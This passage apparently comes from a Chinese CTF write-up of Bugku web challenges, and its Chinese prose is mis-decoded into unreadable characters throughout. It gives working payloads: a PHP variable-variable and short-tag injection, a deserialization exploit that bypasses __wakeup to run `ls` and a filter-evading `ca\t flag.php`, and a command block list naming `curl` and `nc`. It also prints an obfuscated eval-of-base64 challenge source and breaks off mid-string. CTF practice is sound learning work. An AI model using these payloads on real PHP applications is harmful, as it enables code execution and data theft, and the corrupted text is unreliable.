ç¬¬å››ä¸ªifï¼ševalæ‰§è¡Œflagå˜é‡é‡Œé¢çš„å†…å®¹ï¼Œå¹¶ä¸”è¦ç­‰äºflagå˜é‡çš„SHA-1æ•£åˆ—</p></blockquote><p>è¿™é‡Œæˆ‘å®åœ¨æ˜¯ä¸çŸ¥é“æ˜¯å¦‚ä½•èƒ½æ‰§è¡Œåç­‰äºsha1å€¼ï¼Œæˆ‘è§‰å¾—é¢˜ç›®è€ƒç‚¹ä¹Ÿä¸åœ¨è¿™ã€‚æ‰€ä»¥æˆ‘ä»¬é‡‡å–ç»•è¿‡çš„å½¢å¼ï¼Œå¯ä»¥çœ‹åˆ°ç›¸ç­‰åä¼šè¾“å‡ºflag.phpé‡Œé¢å˜é‡$flagçš„å€¼ï¼Œè€Œç°åœ¨åˆå¯ä»¥æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„flagå˜é‡å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ„æˆè¯­å¥è¾¾åˆ°è¾“å‡º$flagçš„ç›®çš„<br> ä¸ºäº†ç»•è¿‡flagè¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpä¸­$$å¼•ç”¨å˜é‡çš„ç‰¹æ€§å’ŒphpçŸ­å†™æ ‡ç­¾çš„ç‰¹æ€§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$$å˜é‡ä½¿ç”¨</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    <span class="variable">$$a</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$$a</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$abc</span>;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*è¾“å‡ºå€¼åˆ†åˆ«å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="comment">abc</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//phpçŸ­æ ‡ç­¾ç‰¹æ€§</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.&lt;?php echo &quot;abc&quot;?&gt;</span></span><br><span class="line"><span class="comment">2.&lt;?=&quot;abc&quot;;?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ä¸Šé¢ä¸¤ä¸ªè¯­å¥éƒ½æ˜¯è¾“å‡ºabc</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆç‚¹å‡»clickhereè·å–$examçš„å€¼:<br> flag=returnâ€™5e22e75193f17cf3e608058536d49e4a7fd7dc56â€™;<br> æ‰€ä»¥$exam=returnâ€™5e22e75193f17cf3e608058536d49e4a7fd7dc56â€™;<br> æ„é€ urlå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag&#x3D;$w&#x3D;blag;$w&#123;0&#125;&#x3D;f;?&gt;888888888888888888888;&lt;?&#x3D;$$w;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/MB%29%40%283X4J_ZZ%7B6SDWZ%401DTU.png" alt=""><br> æˆåŠŸæ‹¿åˆ°flagï¼Œå°±æ˜¯æ²¡çº¢åŒ…äº†å‘œå‘œå‘œã€‚</p><h3 id="å®‰æ…°å¥–"><a class="header-anchor" href="#å®‰æ…°å¥–">Â¶</a>å®‰æ…°å¥–</h3><p>æ‰“å¼€é¡µé¢ï¼Œè¿”å›ä¸€ä¸ªç©ºç™½é¡µé¢ï¼Œå¾¡å‰‘å¯åŠ¨!âš¡ï¸<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/%295N%7B4KOUA3%7DZI%28R%40JN~7V84.png" alt=""><br> æ‰«æåˆ°å­˜åœ¨index.php.bakæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯å¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œæ‰“å¼€å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flagèƒ½è®©ä½ è¿™ä¹ˆå®¹æ˜“æ‹¿åˆ°å—ï¼Ÿ&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ç»™ä½ ä¸ªå®‰æ…°å¥–å§ï¼Œhhhï¼&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢˜å‹æ˜¯ååºåˆ—åŒ–ï¼Œé¦–å…ˆéœ€è¦getä¼ å‚code<br> æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹å¸¸è§çš„phpé­”æœ¯æ–¹æ³•ï¼š</p><blockquote><p>__construct() åˆ›å»ºå¯¹è±¡æ—¶è°ƒç”¨<br> __destruct() é”€æ¯å¯¹è±¡æ—¶è°ƒç”¨<br> __toString() å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨<br> __sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ<br> __wakeup å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</p></blockquote><p>è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ï¼š</p><blockquote><p>public(å…¬æœ‰)<br> protected(å—ä¿æŠ¤)<br> private(ç§æœ‰çš„)<br> protectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00*%00å±æ€§å<br> privateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00ç±»å%00å±æ€§å</p></blockquote><p>åˆ†ææºç <br> é¦–å…ˆåˆå§‹åŒ–ctfç±»çš„æ—¶å€™ä¼šåˆ›å»ºä¸¤ä¸ªå˜é‡ï¼Œusernameå’Œcmdï¼Œæ»¡è¶³username=adminçš„æ—¶å€™å°±ä¼šè¾“å‡ºcmdçš„ç±»å‹ä¸å€¼<br> æ‰€ä»¥æˆ‘ä»¬æ„å»ºå¦‚ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flagèƒ½è®©ä½ è¿™ä¹ˆå®¹æ˜“æ‹¿åˆ°å—ï¼Ÿ&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ç»™ä½ ä¸ªå®‰æ…°å¥–å§ï¼Œhhhï¼&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> ctf(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œåå¾—åˆ°ï¼š<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/1%40O68EH%60IO%7D%252WRXFXJ4%29%29L.png" alt=""><br> å³O:3:â€œctfâ€:2:{s:11:&quot; * username&quot;;s:5:â€œadminâ€;s:6:&quot; * cmd&quot;;s:2:â€œlsâ€;}<br> <strong>æ³¨æ„</strong>ï¼š<br> æˆ‘ä»¬éœ€è¦ç»•è¿‡_wakeup()ï¼Œå°±å¾—æŠŠ2å†™æˆ3ï¼Œå½“ä»£è¡¨å˜é‡ä¸ªæ•°çš„æ•°å­—å¤§äºå®é™…çœŸå®å€¼æ—¶å°±ä¼šç»•è¿‡è¿™ä¸ªå‡½æ•°ï¼Œå¦åˆ™usernameå˜é‡ä¼šè¢«è¦†ç›–æˆguestï¼Œè€Œä¸æ˜¯adminã€‚<br> è¿˜æœ‰ä¸€ç‚¹ï¼Œå°±æ˜¯å‰æ–‡æåˆ°çš„ï¼Œprotectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00*%00å±æ€§å<br> æ‰€ä»¥payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/RMGXZVYRXISXL9%60J981BXV4.png" alt=""><br> å¯ä»¥çœ‹è§æœ‰flag.phpæ–‡ä»¶ï¼Œæˆ‘ä»¬å†catè¯»å–ä¸€ä¸‹ï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤äº†catï¼Œæ‰€ä»¥æˆ‘ä»¬æ”¹æˆca\t flag.php<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/9DY%28%7B74VIOO~Z2%24DMDYJU4T.png" alt=""><br> åœ¨æºç é‡Œæ‰¾åˆ°flag<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O6%24T%60B%7BV6%24%5D2FR2%60%7D4%5D%7B_U9.png" alt=""><br> å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨tacå‘½ä»¤<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O%25ARZ%5D4%40653A5%28L5A9%5BJGR7.png" alt=""></p><h3 id="getshell"><a class="header-anchor" href="#getshell">Â¶</a>getshell</h3><p>æ‰“å¼€ï¼Œçœ‹åˆ°ä¸€å †è¢«æ··æ·†è¿‡åçš„phpæºç ğŸ˜¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span> = urldecode(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">6</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV</span> = <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">18</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">1</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">7</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>.= <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">22</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">36</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">29</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">32</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">35</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>(<span class="string">&quot;JE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGI9IldBckllVEJFWFBaTlN0b3ppZ2hmcENPUlV2S0x5eFFubXdsR2NqYVZiRGtGdUpZZHNNSHF1d1dBZW1NVWhRb0NMYURma0Z4VEtsenRCWHJkT2liSEpqeU52WVNQcGNzSVpFR1JnblZxUWM5alNWd0ZvTlBKU3U1eXJsUjZTMkNzcHV5TlBJb3JMSUk1dnU5RFJVYU9wSHhmbVZSSmIwdGpQQnlvU3lFSXVzRUNQMmlidVU5MlJCNUhCMkV4b0JJVkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzR2h5enZ1NXlwM0VVTFZ4TmJ5QzNHMGFEbU5LckJWdFFTQkNKdUJJSHVIb2twSXhQQnl0aFBKMWp0QjF0dDJhNkx1dGZSbTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdmVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuMzBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZNOXpPdG90MUtBUkp5amIzUDZtMW9pdnlSQkJCb2dvSHlsTGh0YnYyeGtHM3h5THMxZEdCUEdwMjEzQkpSWlB1YW1vVUlubXN0cVFMdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbmZUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdpblYwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25ZdDlka3RsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZlVqVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnT0NWMDdFSXRzdlUxclMyeEd0aElTbUpDYkdoeGtlQmFodDNLdVJOUEhCdTVPdUJpUXRKeTFTc3RjcEJ4THBWUk1iSjlQTGhvbXYyRzlFSXlWdXN4MlNoTWNSaEtRUEhJT1AxdHR0SmlKZUJFRVJJTWZTTkVZZU5Qcm1CYXh0UHhYcGhSTG8yNVBTMUNzYkJpenROSzduVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bm14OWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQzlka3RvdDFLQVJKeWpiM1A2bTFvaXZ5UkJCQm9nb0h5bExodGJ2MnhrRzN4eUxzMWRHQlBHcDIxM0JKUlpQdWFtb1VJbm1zdHFlZk05ZGt0b3QxS0FSSnlqYjNQNm0xb2l2eVJCQkJvZ29IeWxMaHRidjJ4a0czeHlMczFkR0JQR3AyMTNCSlJaUHVhbW9VSW5tc3RxZWZJOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQTBUbWdzdjNLeUcyMW9SdUlPcFZ4TlBCeWhldTlrUk5vWm1VNXJCUHRjdFZvYlMxb210MHhIdFBLS3VOeFFtQmEzdlVFc2J1S2lCWTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmczVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnaW4zMDdFTkk1bUhJWm91OU90VXg0dHNFbVIyQ2RTVWlxTHlNMG0yeWNveXlNbzFLMkdKaUdQUEVCUDFvYXZVUENCQlJXZXN5c3YzQlpRTHRsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZkFPVEw0c2J5b3pHc0NZU0o5aUd